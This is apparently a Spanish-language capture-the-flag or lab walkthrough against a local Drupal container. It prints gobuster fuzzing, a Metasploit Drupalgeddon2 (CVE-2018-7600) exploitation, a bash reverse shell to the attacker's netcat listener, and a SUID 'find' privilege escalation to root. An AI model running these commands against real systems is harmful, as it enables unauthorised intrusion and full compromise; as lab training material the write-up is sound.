## Reconocimiento:

Puerto 80 : HTTP

En la web no hay nada, así que le hago fuzzing:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x html, py, php
```

Encuentro Drupal.

Existe una vulnerabilidad para esa versión, la CVE 2018-7600 (Drupalgeddon2).

Utilizaré Metasploit:

```bash
msfconsole

search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
```

Lo configuro:

```bash
set RHOSTS 172.17.0.2
set TARGETURI /drupal
set LPORT 4444

run
```

Obtengo una shell, pero es inestable. Por lo que me envío una.

Me pongo en escucha:

```bash
nc -lnvp 4445
```

```bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/4445 0>&1"
```

## Escalada

Buscando binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encuentro:

```bash
/usr/bin/find
```

Gracias GTFO Bins:

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```

Listo.
